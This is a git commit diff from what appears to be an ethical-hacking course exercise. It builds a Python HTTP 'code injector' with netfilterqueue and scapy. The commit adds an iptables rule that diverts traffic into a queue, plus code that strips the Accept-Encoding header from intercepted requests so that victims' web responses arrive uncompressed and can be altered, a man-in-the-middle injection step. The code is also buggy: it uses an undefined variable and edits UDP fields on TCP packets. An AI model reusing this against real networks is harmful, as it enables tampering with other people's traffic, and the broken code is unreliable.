3bbeaa47b632da808e42f234309d8a32ecccd210
leekheang <ly.kheang.jr@gmail.com>
2019-06-17 22:52:44 +0700

    modify and decode

--- README.md
+++ README.md
@@ -2,3 +2,6 @@
 Write a code injector 
 
 the haslayer() and getlayer() methods will test for the existence of a layer and return the layer (and any nested layers) respectively. 
+
+Encoding HTTP Responses to Decoding HTTP Responses
+iptables -I OUTPUT/INPUT -j NFQUEUE --queue-num 1
--- codeinjector.py
+++ codeinjector.py
@@ -1,5 +1,15 @@
 import netfilterqueue 
 import scapy.all as scapy 
+import re 
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    del scapy_packet[scapy.UDP].chksum
+    del scapy_packet[scapy.UDP].len
+    return packet
+
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
@@ -7,11 +17,14 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
             print(scapy_packet.show())
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet , modified_load)
+            packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Respone")
             print(scapy_packet.show())
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
+queue.bind(1, process_packet)
 queue.run()
